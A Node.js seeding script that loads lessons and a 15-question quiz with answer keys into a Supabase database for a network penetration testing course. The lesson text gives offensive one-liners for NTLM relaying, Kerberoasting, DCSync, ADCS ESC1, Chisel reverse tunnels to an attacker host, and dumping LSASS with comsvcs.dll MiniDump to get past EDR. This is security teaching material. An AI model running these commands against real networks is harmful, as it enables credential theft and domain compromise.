import { createClient } from "@supabase/supabase-js";
import fs from "fs";

const envFile = fs.readFileSync(".env", "utf-8");
const env = Object.fromEntries(
  envFile
    .split("\n")
    .filter((l) => l.includes("="))
    .map((l) => l.trim().split("="))
);

const supabaseUrl = env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseKey = env.SUPABASE_SERVICE_ROLE_KEY || env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

const skillId = "88bf38ce-7d93-4d15-a78c-cd10b04a0faa";

async function run() {
  console.log("Updating Skill #50: Network Penetration Testing (9 steps across 3 tracks)...");

  // 1. Fetch tracks for this skill
  let { data: tracks, error: tErr } = await supabase
    .from("tracks")
    .select("id, title, order_index")
    .eq("skill_id", skillId)
    .order("order_index");

  if (tErr) {
    console.error("Error fetching tracks:", tErr);
    return;
  }

  // If there are extra tracks (e.g. 4), delete extra
  if (tracks.length > 3) {
    const extraTrackIds = tracks.slice(3).map((t) => t.id);
    await supabase.from("steps").delete().in("track_id", extraTrackIds);
    await supabase.from("tracks").delete().in("id", extraTrackIds);
    tracks = tracks.slice(0, 3);
  }

  const track1Id = tracks[0].id;
  const track2Id = tracks[1].id;
  const track3Id = tracks[2].id;

  // Update Track titles
  await supabase.from("tracks").update({ title: "Track 1: Network Reconnaissance, Port Scanning and LLMNR Poisoning" }).eq("id", track1Id);
  await supabase.from("tracks").update({ title: "Track 2: Active Directory Exploitation, Kerberos and ADCS Escapes" }).eq("id", track2Id);
  await supabase.from("tracks").update({ title: "Track 3: Lateral Movement, Pivoting Tunnels and LSASS Credential Harvesting" }).eq("id", track3Id);

  // Delete existing steps
  await supabase.from("steps").delete().in("track_id", [track1Id, track2Id, track3Id]);

  // Steps Data (Graduate / OSCP / CRTP Red Teaming level content)
  const steps = [
    // Track 1
    {
      track_id: track1Id,
      title: "Advanced Nmap Scanning Mechanics and NSE Scripting",
      order_index: 1,
      content: `### Network Port Scanning Architecture and Probe Dynamics

Network penetration testing begins with structured host discovery and port state enumeration:

1. Nmap Scanning Mechanics:
   - TCP SYN Stealth Scan (-sS): Sends SYN packet; receives SYN-ACK (port open) and immediately sends RST to tear down the socket without completing the 3-way handshake (leaves fewer application-level log footprints).
   - TCP Connect Scan (-sT): Completes the full 3-way handshake via the operating system network stack; mandatory when running without root/raw socket privileges.
   - UDP Scanning (-sU): Dispatches empty UDP probes; inferring open ports when no ICMP Port Unreachable error packets return.
   - Service Versioning & OS Fingerprinting: -sV (queries service banners and probes response regexes) and -O (measures TCP window sizes, IP ID sequencing, and initial sequence number entropy).
   - Timing Templates: -T4 (Aggressive LAN scanning) vs -T2 (Polite IDS evasion).

2. Nmap Scripting Engine (NSE):
   - Executing categorized Lua scripts: --script=vuln, --script=smb-vuln-ms17-010, --script=ssl-enum-ciphers.`
    },
    {
      track_id: track1Id,
      title: "Service Fingerprinting, SNMP and SMB Null Sessions",
      order_index: 2,
      content: `### Deep Service Enumeration and Unauthenticated Information Gathering

1. SNMP Enumeration (UDP 161):
   - Simple Network Management Protocol queries using default community strings (public, private).
   - Tools: onesixtyone (high-speed community string brute-forcing) and snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2 to extract running process lists, installed software packages, and network interface IP configurations.

2. SMB and RPC Enumeration (TCP 445 / 139):
   - Querying domain information without credentials via SMB Null Sessions (username "" and password ""):
     - Tools: enum4linux-ng and rpcclient -U "" -N target.
     - Commands: enumdomusers (extracting domain usernames), queryuser (retrieving user descriptions and password policy), and netshareenumall (listing accessible network shares).`
    },
    {
      track_id: track1Id,
      title: "Network Poisoning: LLMNR, NBT-NS and NTLM Relay Attacks",
      order_index: 3,
      content: `### Broadcast Name Resolution Poisoning and NTLM Relaying

1. LLMNR and NetBIOS Name Service (NBT-NS) Poisoning:
   - When a Windows workstation attempts to access a nonexistent network share (e.g. \\\\fileservr), DNS lookup fails, prompting the host to broadcast LLMNR/NBT-NS queries on the local subnet.
   - Responder: Listens for multicast broadcasts, answers as the requested server, and forces the victim host to authenticate and send an NTLMv2 challenge-response hash.

2. NTLM Relaying with ntlmrelayx:
   - Rather than cracking harvested NTLMv2 hashes offline, an attacker relays incoming authentication attempts directly to target servers where SMB Signing is disabled (RequireSecuritySignature=false).
   - Automatically dumps local SAM database hashes or executes interactive command payloads, achieving instant domain compromise.`
    },

    // Track 2
    {
      track_id: track2Id,
      title: "Active Directory Domain Enumeration: BloodHound and Graph Theory",
      order_index: 1,
      content: `### Active Directory Attack Path Analysis and Graph Theory

1. BloodHound / SharpHound Data Collection:
   - Ingests Active Directory LDAP objects, user sessions, group memberships, and Access Control Lists (ACLs) into a Neo4j graph database.
   - Reconstructs complex non-obvious attack paths to full domain dominance:
     - Shortest paths to Domain Admin.
     - GenericAll / GenericWrite permissions over user and group objects.
     - WriteDacl rights allowing arbitrary permission assignment.
     - ForceChangePassword rights allowing unauthorized password resets.

2. PowerView and NetExec (CrackMapExec):
   - Command-line LDAP enumeration: Get-DomainUser -SPN, Get-DomainGPO, Find-LocalAdminAccess.`
    },
    {
      track_id: track2Id,
      title: "Kerberos Exploitation: Kerberoasting, AS-REP Roasting and DCSync",
      order_index: 2,
      content: `### Attacking Kerberos Protocols and Domain Controller Synchronization

1. Kerberoasting:
   - Any valid domain user can request a Kerberos Ticket Granting Service (TGS) ticket for any account registered with a Service Principal Name (SPN).
   - The TGS ticket is encrypted with the service account's NTLM password hash; extracted and cracked offline via hashcat -m 13100.

2. AS-REP Roasting:
   - Targets domain user accounts configured with 'Do not require Kerberos pre-authentication' (DONT_REQ_PREAUTH).
   - The attacker requests an AS-REP ticket without knowing the user's password; the returned ticket encrypted with the user's hash is cracked offline using hashcat -m 18200.

3. DCSync Attack:
   - Abuses DS-Replication-Get-Changes and DS-Replication-Get-Changes-All directory replication rights via Mimikatz (lsadump::dcsync) or Impacket secretsdump.py, impersonating a Domain Controller to dump every NTLM hash (including the krbtgt account) across the entire domain forest.`
    },
    {
      track_id: track2Id,
      title: "Active Directory Certificate Services (ADCS) Exploitation",
      order_index: 3,
      content: `### Enterprise PKI Misconfigurations and ADCS Privilege Escalation

1. Certified Pre-Owned (ADCS Attack Vectors):
   - Active Directory Certificate Services often deploy misconfigured certificate templates allowing unprivileged users to request high-privilege identity certificates.

2. ESC1 Exploitation:
   - Vulnerability Requirements:
     - Certificate template grants enrollment rights to low-privileged users.
     - Template specifies Client Authentication Extended Key Usage (EKU).
     - Template has CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled, allowing the requester to specify any Subject Alternative Name (SAN).
   - Execution (Certipy):
     - The unprivileged attacker requests a certificate specifying --alt-name Administrator.
     - Uses the resulting certificate with PKINIT (gettgtpkinit.py) to obtain a valid Kerberos TGT ticket for the Domain Administrator, achieving instant full domain compromise.`
    },

    // Track 3
    {
      track_id: track3Id,
      title: "Lateral Movement: Impacket Suite, PsExec, WMI and WinRM",
      order_index: 1,
      content: `### Network Traversal and Remote Execution Mechanisms

1. Impacket Toolset Execution Mechanics:
   - psexec.py: Uploads a temporary service binary (PSEXESVC.exe), registers and starts a Windows service over SMB named pipes, and redirects input/output to provide an interactive SYSTEM shell.
   - wmiexec.py: Executes commands through WMI (Win32_Process) and writes output to an admin share (ADMIN$), providing semi-interactive shell execution without creating noticeable service binaries.
   - smbexec.py: Executes commands by creating ephemeral native batch services directly.

2. Windows Remote Management (WinRM / Evil-WinRM):
   - Interacts with WinRM services over HTTP (port 5985) or HTTPS (port 5986) using credentials or Pass-the-Hash (-H <NTLM_HASH>), providing clean PowerShell remoting.`
    },
    {
      track_id: track3Id,
      title: "Network Pivoting and Tunneling: Chisel, SSH and Ligolo-ng",
      order_index: 2,
      content: `### Bypassing Firewall Boundaries and Multi-Homed Network Pivoting

1. Dynamic SSH SOCKS5 Forwarding:
   - ssh -D 1080 user@pivot_host: Creates a local SOCKS5 proxy routing penetration testing traffic through proxychains4.

2. Chisel HTTP-Encapsulated Tunnels:
   - Creates encrypted TCP tunnels over WebSockets/HTTP, bypassing strict outbound egress firewalls:
     - Server (Attacker): chisel server -p 8000 --reverse
     - Client (Compromised Host): chisel client attacker:8000 R:socks

3. Ligolo-ng (High-Performance TUN Interfaces):
   - Establishes a virtual TUN network adapter directly on the attacker operating system:
   - Eliminates the performance bottlenecks and tool incompatibilities of proxychains, enabling full raw Nmap SYN scans and multi-threaded tools directly into internal subnets.`
    },
    {
      track_id: track3Id,
      title: "Post-Exploitation and LSASS Credential Harvesting",
      order_index: 3,
      content: `### In-Memory Credential Extraction and EDR Evasion

1. Local Security Authority Subsystem Service (LSASS) Harvesting:
   - LSASS maintains cached plaintext credentials, NTLM hashes, and Kerberos tickets in memory for active user sessions.
   - Mimikatz: privilege::debug followed by sekurlsa::logonpasswords directly reading LSASS memory.

2. EDR Bypass and Memory Dumping:
   - Modern EDR agents intercept direct open handles to lsass.exe with PROCESS_VM_READ permissions.
   - Native LOLBAS Memory Dumps:
     - rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> lsass.dmp full
     - Sysinternals ProcDump: procdump.exe -ma lsass.exe lsass.dmp
   - The dumped memory file is exfiltrated to an offline Linux environment and parsed with Pypykatz, bypassing host EDR alarms entirely.`
    }
  ];

  for (const step of steps) {
    const { error: sErr } = await supabase.from("steps").insert(step);
    if (sErr) console.error("Step insert error:", sErr);
  }

  console.log("Successfully inserted 9 expert steps across 3 tracks for Skill #50.");

  // 2. Clear old quiz questions and insert 15 expert quiz questions
  await supabase.from("quiz_questions").delete().eq("skill_id", skillId);

  const quizQuestions = [
    // 5 EASY (Correct indices: 0, 2, 1, 3, 0)
    {
      skill_id: skillId,
      question_text: "In Nmap network scanning, what does the '-sS' (TCP SYN Stealth Scan) flag do differently from a standard connect scan?",
      options: [
        "It sends a SYN packet and sends a RST immediately upon receiving a SYN-ACK, tearing down the socket without completing the 3-way handshake",
        "It turns off the target computer",
        "It sends an encrypted email to the target",
        "It only scans port 80"
      ],
      correct_option_index: 0,
      explanation: "TCP SYN scanning (half-open scanning) sends RST immediately upon receiving SYN-ACK, avoiding completing the 3-way handshake.",
      difficulty: "easy",
      order_index: 1
    },
    {
      skill_id: skillId,
      question_text: "What open-source tool uses graph theory (Neo4j) to analyze Active Directory LDAP objects, sessions, and ACLs to reveal non-obvious shortest attack paths to Domain Admin?",
      options: [
        "Wireshark",
        "Notepad",
        "BloodHound (SharpHound)",
        "Nessus"
      ],
      correct_option_index: 2,
      explanation: "BloodHound analyzes Active Directory relationships and permissions using graph theory to identify shortest attack paths to domain compromise.",
      difficulty: "easy",
      order_index: 2
    },
    {
      skill_id: skillId,
      question_text: "What tool listens for broadcast LLMNR and NetBIOS Name Service (NBT-NS) queries on a local subnet to capture incoming NTLMv2 challenge-response hashes from Windows hosts?",
      options: [
        "Calculator",
        "Responder",
        "Docker",
        "Git"
      ],
      correct_option_index: 1,
      explanation: "Responder answers LLMNR/NBT-NS broadcast resolution requests, poisoning local name resolution to harvest authentication hashes.",
      difficulty: "easy",
      order_index: 3
    },
    {
      skill_id: skillId,
      question_text: "In Active Directory attacks, what is 'Kerberoasting'?",
      options: [
        "Cooking food on a server",
        "Deleting domain controller hard drives",
        "Disabling all firewalls",
        "Requesting Kerberos TGS service tickets for user accounts with Service Principal Names (SPNs) and cracking the encrypted ticket offline with hashcat"
      ],
      correct_option_index: 3,
      explanation: "Kerberoasting requests service tickets encrypted with service account password hashes, allowing offline brute-force cracking.",
      difficulty: "easy",
      order_index: 4
    },
    {
      skill_id: skillId,
      question_text: "What Windows operating system process stores cached plaintext credentials, NTLM password hashes, and Kerberos tickets in system memory?",
      options: [
        "LSASS (Local Security Authority Subsystem Service - lsass.exe)",
        "explorer.exe",
        "notepad.exe",
        "calc.exe"
      ],
      correct_option_index: 0,
      explanation: "lsass.exe manages security policies and authentication tokens, caching credentials in process memory.",
      difficulty: "easy",
      order_index: 5
    },

    // 5 MODERATE (Correct indices: 3, 1, 0, 2, 3)
    {
      skill_id: skillId,
      question_text: "In Active Directory Certificate Services (ADCS) exploitation, what misconfiguration in a certificate template defines the 'ESC1' privilege escalation vector?",
      options: [
        "The certificate template has no password",
        "The certificate template is expired",
        "The certificate template is written in HTML",
        "The template permits enrollment by unprivileged users, specifies Client Authentication EKU, and has 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' enabled, allowing the requester to specify an arbitrary Subject Alternative Name (e.g. Administrator)"
      ],
      correct_option_index: 3,
      explanation: "ESC1 allows low-privileged users to request client authentication certificates specifying an arbitrary administrator SAN, leading to full domain takeover.",
      difficulty: "moderate",
      order_index: 6
    },
    {
      skill_id: skillId,
      question_text: "In lateral movement, how does an 'NTLM Relay Attack' (via ntlmrelayx) compromise target machines without cracking harvested password hashes?",
      options: [
        "By guessing the password in 1 attempt",
        "It relays live captured NTLM authentication attempts directly to target servers where SMB Signing is disabled, executing code or dumping SAM hashes instantly",
        "By turning off the electricity",
        "By sending phishing emails"
      ],
      correct_option_index: 1,
      explanation: "NTLM relaying forwards captured authentication tokens to secondary targets where SMB signing is not enforced, gaining unauthorized administrative access.",
      difficulty: "moderate",
      order_index: 7
    },
    {
      skill_id: skillId,
      question_text: "What directory replication rights abuse allows an attacker using Mimikatz or Impacket's 'secretsdump.py' to simulate a Domain Controller and dump all password hashes (DCSync)?",
      options: [
        "DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights",
        "Read access to C:\\Windows",
        "Internet access",
        "Print operator rights"
      ],
      correct_option_index: 0,
      explanation: "The DCSync attack abuses directory replication rights to request password data from domain controllers via the Directory Replication Service (DRS) protocol.",
      difficulty: "moderate",
      order_index: 8
    },
    {
      skill_id: skillId,
      question_text: "In network pivoting and tunneling, why does Ligolo-ng provide a superior operational experience compared to traditional SSH dynamic port forwarding and proxychains?",
      options: [
        "Ligolo-ng is 50 years old",
        "Ligolo-ng requires no internet",
        "Ligolo-ng creates a virtual TUN network adapter on the attacker machine, allowing direct IP routing and native high-speed Nmap SYN scans without proxychains bottlenecks",
        "Ligolo-ng only works on printers"
      ],
      correct_option_index: 2,
      explanation: "Ligolo-ng establishes a kernel-level TUN interface, enabling native routing and high-speed tool execution without proxychains overhead.",
      difficulty: "moderate",
      order_index: 9
    },
    {
      skill_id: skillId,
      question_text: "In Kerberos exploitation, what account configuration setting allows an attacker to perform an 'AS-REP Roasting' attack against a domain user?",
      options: [
        "Account is locked out",
        "Password never expires",
        "User must change password at next logon",
        "The account has 'Do not require Kerberos pre-authentication' (DONT_REQ_PREAUTH) enabled"
      ],
      correct_option_index: 3,
      explanation: "Disabling Kerberos pre-authentication allows any attacker to request an AS-REP response containing the user's encrypted password hash for offline cracking.",
      difficulty: "moderate",
      order_index: 10
    },

    // 5 DIFFICULT (Correct indices: 1, 2, 0, 3, 1)
    {
      skill_id: skillId,
      question_text: "In lateral movement, what is the architectural difference between Impacket's 'psexec.py' and 'wmiexec.py' in terms of endpoint artifacts left on the target system?",
      options: [
        "psexec.py uses web browsers; wmiexec.py uses email",
        "psexec.py uploads a service binary (PSEXESVC.exe) and registers a Windows service, creating loud event logs; wmiexec.py invokes WMI Win32_Process commands over DCOM/RPC without creating binary services",
        "wmiexec.py reboots the computer every time",
        "psexec.py only works on Linux"
      ],
      correct_option_index: 1,
      explanation: "psexec creates service binaries on disk leaving loud Event ID 7045 logs; wmiexec executes stealthily via WMI Win32_Process over RPC.",
      difficulty: "difficult",
      order_index: 11
    },
    {
      skill_id: skillId,
      question_text: "In EDR evasion, how do penetration testers harvest LSASS memory credentials without triggering alerts caused by direct API calls to OpenProcess with PROCESS_VM_READ?",
      options: [
        "By taking a screenshot of the desktop",
        "By guessing the password",
        "By utilizing native LOLBAS utilities (e.g. 'rundll32.exe comsvcs.dll, MiniDump' or ProcDump) to generate memory minidumps and exfiltrating them for offline parsing with Pypykatz",
        "By deleting the LSASS process"
      ],
      correct_option_index: 2,
      explanation: "Using native signed binaries (comsvcs.dll / ProcDump) to dump memory bypasses direct API monitoring; parsing occurs offline on an attacker system.",
      difficulty: "difficult",
      order_index: 12
    },
    {
      skill_id: skillId,
      question_text: "In SNMP service reconnaissance, what Object Identifier (OID) tree branch is walked by 'snmpwalk' to enumerate running process names and paths on a target host?",
      options: [
        "1.3.6.1.2.1.25.4.2.1.2 (HOST-RESOURCES-MIB::hrSWRunPath)",
        "1.1.1.1",
        "8.8.8.8",
        "0.0.0.0"
      ],
      correct_option_index: 0,
      explanation: "The 1.3.6.1.2.1.25.4.2.1.2 MIB tree contains hrSWRunPath, enumerating all active software processes executing on the target host.",
      difficulty: "difficult",
      order_index: 13
    },
    {
      skill_id: skillId,
      question_text: "Why does Chisel provide an effective tunneling solution for pivoting through restrictive corporate egress environments?",
      options: [
        "Chisel does not use TCP packets",
        "Chisel is built into Windows by default",
        "Chisel runs inside BIOS firmware",
        "It encapsulates bidirectional TCP connections and SOCKS5 proxies inside standard HTTP and WebSocket connections, traversing Layer 7 inspection firewalls that block standard SSH tunnels"
      ],
      correct_option_index: 3,
      explanation: "Chisel tunnels data over standard WebSockets and HTTP/HTTPS, bypassing egress filtering rules that block non-HTTP protocols.",
      difficulty: "difficult",
      order_index: 14
    },
    {
      skill_id: skillId,
      question_text: "In Active Directory delegation attacks, what occurs when an account is configured with 'Unconstrained Delegation'?",
      options: [
        "The account has no password",
        "Whenever a user authenticates to a service hosted by that account, the domain controller sends the user's complete Kerberos TGT ticket, which is stored in memory and can be extracted by an attacker with SYSTEM rights on that host",
        "The account is deleted immediately",
        "The account can only log in from local console"
      ],
      correct_option_index: 1,
      explanation: "Unconstrained delegation caches the full Kerberos TGT of any connecting user in memory, allowing attackers to harvest administrative TGTs.",
      difficulty: "difficult",
      order_index: 15
    }
  ];

  for (const q of quizQuestions) {
    const { error: qErr } = await supabase.from("quiz_questions").insert(q);
    if (qErr) console.error("Quiz question insert error:", qErr);
  }

  console.log("Successfully inserted 15 expert quiz questions with randomized correct answers for Skill #50.");
  console.log("Skill #50 update completed successfully!");
}

run();
